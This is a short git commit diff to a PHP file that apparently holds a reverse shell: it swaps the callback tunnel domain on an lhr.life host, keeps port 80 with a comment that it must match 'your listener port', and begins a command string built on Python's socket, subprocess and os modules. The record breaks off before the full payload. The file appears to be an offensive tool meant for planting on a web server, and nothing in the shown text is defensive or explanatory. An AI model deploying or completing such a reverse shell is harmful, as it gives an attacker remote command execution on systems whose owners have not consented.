46074e26ddd838656855ce34951c4fa676d94adc
Zzscript <147871556+antonysimoncodes@users.noreply.github.com>
2025-08-18 23:11:02 +0530

    code1.php

--- code1.php
+++ code1.php
@@ -1,5 +1,5 @@
 <?php
-$domain = 'ad6aa00c0584b1.lhr.life'; // use the domain name
+$domain = '584f39183a65a8.lhr.life'; // use the domain name
 $port = 80; // must match your listener port
 
 $cmd = "python3 -c \"import socket,subprocess,os;" .
